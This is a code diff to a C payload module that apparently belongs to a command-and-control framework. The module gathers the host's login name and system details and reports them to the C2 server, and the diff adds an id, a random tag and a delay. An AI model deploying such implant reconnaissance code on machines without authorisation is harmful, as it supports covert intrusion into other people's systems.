@@ -2,12 +2,18 @@
 #include <stdio.h>
 #include <string.h>
 #include <sys/utsname.h>
+#include <time.h>
 
 #include "../OutputFormatter.h" // Required!
 
-typedef void(*output_func)(const char* fmt, ...); // For printing output on C2 server.
+typedef void(*output_func)(int, const char* fmt, ...); // For printing output on C2 server.
 
-int payload_init(output_func output) {
+int payload_init(int id, output_func output) {
+
+    srand(time(NULL));
+    int randInt = rand() % 1000;
+
+    sleep(10);
 
     // Get username.
     char* username = getlogin();
@@ -15,7 +21,7 @@ int payload_init(output_func output) {
     // Get computer information.
     struct utsname buffer;
     if (uname(&buffer) < 0) {
-        output("Failed to get uname information! Error code: %d\n", errno);
+        output(id, "Failed to get uname information! Error code: %d\n", errno);
         return 1;
     }
 
@@ -23,8 +29,9 @@ int payload_init(output_func output) {
     int infoSize = 65*3;
     char info[infoSize];
 
-    snprintf(info, infoSize, "%s %s %s", buffer.release, buffer.machine, buffer.version); // From OutputFormatter.h
+    snprintf(info, infoSize, "%d %s %s %s", randInt, buffer.release, buffer.machine, buffer.version); // From OutputFormatter.h
 
-    output("%s %s %s", buffer.release, buffer.machine, buffer.version);
+    output(id, "%d %s %s %s", randInt, buffer.release, buffer.machine, buffer.version);
+    output(id, "Oh yeah, also...\\n");
     return 0;
 }
